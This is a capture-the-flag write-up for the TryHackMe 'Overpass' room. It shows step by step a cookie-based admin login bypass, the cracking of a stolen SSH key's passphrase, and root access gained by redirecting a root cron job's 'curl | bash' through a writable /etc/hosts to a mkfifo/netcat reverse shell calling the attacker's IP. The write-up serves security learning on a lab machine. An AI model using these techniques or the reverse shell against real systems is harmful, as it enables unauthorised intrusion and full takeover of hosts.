<p align="center">
  THM : Overpass<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/overpass<br>
  <img src="https://i.imgur.com/jOkERbW.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Get a shell](#get-a-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's start with an agressive [nmap](https://nmap.org/) scan to find out open ports on the target :  
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-19 16:28 CEST
Nmap scan report for 10.10.241.137
Host is up (0.063s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.29 seconds
```

- port 22 is open (SSH)
- port 80 is open, there is a webserver running on this host, we will enumerate it using [Gobuster](https://github.com/OJ/gobuster) and then manually.

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

```
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.137/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2022/10/19 16:35:06 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /http:/community]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /http:/radar]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /http:/swik]
Progress: 220488 / 220561 (99.97%)
===============================================================
2022/10/19 16:46:44 Finished
===============================================================
```

### Manual enumeration

There is an admin page on this website, let's take a look at it using a web browser :  
![](https://i.imgur.com/SbDZ4VK.jpg)  

The website is asking for credentials, brute force or SQL injections are not useful here, so let's take a look at the source code and see how the website checks if you are logged in 
or not :  
![](https://i.imgur.com/WWnkEvp.jpg)  

You can notice that the website is just checking if the "SessionToken" cookie equals "Incorrect credentials", if it doesn't, the access is granted. So we can create a cookie named 
"SessionToken", write any value in it (Other than "Incorrect Credentials"), and we should be logged in :  
![](https://i.imgur.com/Nk4bamK.jpg)  

Now let's refresh the page and see what happens :  
![](https://i.imgur.com/DZx4pdj.jpg)  

We are logged in ! We can see now an SSH private key that belongs to user "James". Let's copy it in a file and use it to try to login as "James" using SSH :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ echo '-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----' > james_private_key.txt
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ chmod 600 james_private_key.txt 
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ ssh james@10.10.241.137 -i james_private_key.txt 
The authenticity of host '10.10.241.137 (10.10.241.137)' can't be established.
ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.241.137' (ECDSA) to the list of known hosts.
Enter passphrase for key 'james_private_key.txt':
```

It asks for a passphrase. 

## Get a shell

We can try to crack the passphare for the SSH private key using [John The Ripper](https://github.com/openwall/john) and [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ ssh2john james_private_key.txt > james_private_key.hash
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ john james_private_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
james13          (james_private_key.txt)     
1g 0:00:00:00 DONE (2022-10-19 21:53) 14.28g/s 191085p/s 191085c/s 191085C/s lespaul..handball
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the passphrase for the SSH private key, now we can log in on SSH with the private key :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ ssh james@10.10.241.137 -i james_private_key.txt 
Enter passphrase for key 'james_private_key.txt': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 19 19:55:30 UTC 2022

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 16%                IP address for eth0: 10.10.241.137
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$
```

We are now logged in on the target ! Let's get the user.txt flag :  
```
james@overpass-prod:~$ cat user.txt
thm{*************************}
```

## Privilege escalation

Now it's time to escalate our privileges. Let's see what's inside "/home/james" directory :  
```
james@overpass-prod:~$ ls -la
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
```

There is a file named "todo.txt", let's see what's inside it :  
```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$
```

So we know there is an automated script that runs on the target, maybe we can exploit it to escalate our privileges. Let's take a look at "/etc/crontab" :  
```
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

You can notice a cron job running as root. This cron job gets a shell script at "overpass.thm/downloads/src/buildscript.sh" and execute it. If we find a way to make the target get a script 
on our machine, we can make the target execute anything we want as root ! Since the cron job makes a request to overpass.thm, we can take a look at /etc/hosts and see if we have write 
permissions on it :  
```
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We have write permissions on "/etc/hosts" ! We can edit the line "127.0.0.1 overpass.thm" to "[ATTACKER_IP] overpass.thm" :  
```
james@overpass-prod:~$ nano /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.14.32.60 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, the cron job will make a request to our attacker machine, we just have to create the same path as in the cron job :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ mkdir downloads
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ cd downloads/
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads$ mkdir src
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads$ cd src
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads/src$
```

We can create our own "buildscript.sh" and save it in the path we have just created. Let's write a reverse shell in it :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads/src$ echo '#!/bin/bash' > buildscript.sh
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads/src$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4242 >/tmp/f' >> buildscript.sh 
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads/src$ cat buildscript.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.32.60 4242 >/tmp/f
attacker@AttackBox:~/Documents/THM/CTF/Overpass/downloads/src$
```

Let's setup a netcat listener on port 4242 : 
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ nc -lnvp 4242
listening on [any] 4242 ...
```

Now, we can start a webserver in the right diretory (where the "/downloads" directory is located) :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ sudo python3 -m http.server 80
[sudo] Mot de passe de attacker : 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.26.100 - - [19/Oct/2022 22:43:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

We just received a GET request ! Let's take a look at our netcat listener :  
```
attacker@AttackBox:~/Documents/THM/CTF/Overpass$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.26.100] 34114
sh: 0: can't access tty; job control turned off
# whoami     
root
#
```

We have a shell as root ! Let's get the root flag now :  
```
# ls
buildStatus
builds
go
root.txt
src
# cat root.txt
thm{*******************************}
# 
```

## Conclusion

In this room, I learned a new way to elevate our privileges (by exploiting a cron job that makes a GET request with a writable /etc/hosts). This room was very cool ! Thanks for this room ! 
And thanks for reading my write ups !
